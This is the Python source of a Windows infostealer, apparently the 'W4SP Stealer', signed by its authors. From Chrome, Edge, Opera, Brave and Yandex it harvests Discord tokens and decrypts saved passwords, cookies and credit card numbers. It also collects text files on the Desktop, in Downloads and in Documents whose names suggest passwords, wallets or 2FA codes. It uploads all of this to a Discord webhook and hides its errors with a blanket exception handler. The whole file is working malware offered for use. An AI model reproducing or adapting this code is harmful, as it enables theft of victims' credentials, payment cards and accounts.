#  THIS IS BETA VERSION
#    BY W4SP, loTus04
# 

try:
    import os
    import threading
    # from urllib.request import Request, urlopen
    from sqlite3 import connect as sql_connect
    import re
    from base64 import b64decode
    from json import loads as json_loads, load
    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
    from turtle import up
    from Crypto.Cipher import AES
    import shutil
    # from zipfile import ZipFile
    import random
    # from colorama import Fore

    def InstallRequests():
        try:
            import requests
        except:
            os.system("pip install requests")

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    temp = os.getenv("TEMP")
    Threadlist = []


    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', POINTER(c_char))
        ]

    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw

    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()

        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)

    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]

        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass

    def upload(name):
        path = name
        files = {'file': open(path, 'rb')}
        pip = threading.Thread(target=InstallRequests)
        pip.start()
        pip.join()
        import requests
        requests.post('DISCORD_WEBHOOK', files=files)


    def writeforfile(data, name):
        path = os.getenv("TEMP") + f"\wp{name}.txt"
        with open(path, mode='w', encoding='utf-8') as f:
            f.write(f"<--W4SP STEALER ON TOP-->\n\n")
            for line in data:
                if line[0] != '':
                    f.write(f"{line}\n")

    Tokens = []
    def getToken(path, arg):
        global Tokens
        if not os.path.exists(path): return

        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb") or file.endswith(".sqlite"):
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            if token not in Tokens:
                                Tokens.append(token)
                                # print(token)
        writeforfile(Tokens, 'tokens')

    Passw = []
    def getPassw(path, arg):
        global Passw
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            # print([row[0], row[1], DecryptValue(row[2], master_key)])
        writeforfile(Passw, 'passw')

    Cookies = []    
    def getCookie(path, arg):
        global Cookies
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data: 
            if row[0] != '':
                Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            # print([row[0], row[1], DecryptValue(row[2], master_key)])
        writeforfile(Cookies, 'cook')

    CreditCards = []
    def getCredCard(path, arg):
        global CreditCards
        if not os.path.exists(path): return
        
        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return
        
        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CreditCards.append(f'''---------------------------------------------\nNumber: {DecryptValue(row[3], master_key)}\nDate: {row[1]}/{row[2]}\nName: {row[0]}\n---------------------------------------------''')
            # print([row[0], row[1], DecryptValue(row[2], master_key)])
        writeforfile(CreditCards, 'cc')


    def getExodus():
        pass


    def GatherAll():
        t='default path | token | password | cookies | cc'
        browserPaths = [
            [f"{roaming}/Opera Software/Opera GX Stable", "/Local Storage/leveldb", "/", "/Network"],
            [f"{roaming}/Opera Software/Opera Stable", "/Local Storage/leveldb", "/", "/Network"],
            [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "/Local Storage/leveldb", "/", "/Network"],
            [f"{local}/Google/Chrome/User Data/", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network"],
            [f"{local}/Google/Chrome SxS/User Data", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network"],
            [f"{local}/BraveSoftware/Brave-Browser/User Data", "/Default/Local Storage/leveldb", "/Default", "/Default"],
            [f"{local}/Yandex/YandexBrowser/User Data", "/", "/", "/"],
            [f"{local}/Microsoft/Edge/User Data", "/Default/Local Storage/leveldb", "/Default", "/Default/Network"]
        ]

        discordPaths = [
            roaming + "/Discord/Local Storage/leveldb",
            roaming + "/Lightcord/Local Storage/leveldb",
            roaming + "/discordcanary/Local Storage/leveldb",
            roaming + "/discordptb/Local Storage/leveldb",
        ]

        # otherPaths = [
        #     roaming + "Exodus/exodus.wallet"
        #      roaming + "Exodus/atomic"

        # ]
        
        # load tokens
        for patt in browserPaths: 
            a = threading.Thread(target=getToken, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)
        for patt in discordPaths: 
            a = threading.Thread(target=getToken, args=[patt, ''])
            a.start()
            Threadlist.append(a)

        for patt in browserPaths: 
            a = threading.Thread(target=getPassw, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)

        for patt in browserPaths: 
            a = threading.Thread(target=getCookie, args=[patt[0], patt[3]])
            a.start()
            Threadlist.append(a)

        for patt in browserPaths: 
            a = threading.Thread(target=getCredCard, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)
        
        for thread in Threadlist: 
            thread.join()
        global upths
        upths = []
        for file in ["wppassw.txt", "wpcook.txt", "wpcc.txt", "wptokens.txt"]:
            upth = threading.Thread(target=upload, args=[os.getenv("TEMP") + "\\" + file])
            upth.start()
            upths.append(upth)


    KiwiFiles = []
    def KiwiSearch(path, keywords):
        global KiwiFiles
        listOfFile = os.listdir(path)

        for file in listOfFile:
            for worf in keywords:
                if worf in file.lower() and ".txt" in file:
                    KiwiFiles.append(path + "/" + file)
                    break


    def Kiwi():
        user = temp.split("\AppData")[0]
        path2search = [
            user + "/Desktop",
            user + "/Downloads",
            user + "/Documents"
        ]

        key_words =[
            "passw",
            "mdp",
            "motdepasse",
            "mot_de_passe",
            "login",
            "paypal",
            "banque",
            "account",
            "metamask",
            "wallet",
            "crypto",
            "exodus",
            "discord",
            "2fa",
            "code",
            ]

        wikith = []
        for patt in path2search: 
            kiwi = threading.Thread(target=KiwiSearch, args=[patt, key_words])
            kiwi.start()
            wikith.append(kiwi)

    GatherAll()
    Kiwi()

    for thread in Threadlist: thread.join()
    for thread in upths: thread.join()

    os.system('')
    for file in KiwiFiles:
        if os.path.isfile(file):
            if not " " in file:# file and not "'" in file and not '"' in file:
                # threading.Thread(target=upload, args=[file]).start()
                upload(file)
            #     print(file)
            # else: 
            #     print(f"{Fore.RED}{file}{Fore.RESET}")

    # import time
    # time.sleep(1)
    # for a in KiwiFiles: print(a)
        # print(KiwiFiles)
except:
    pass

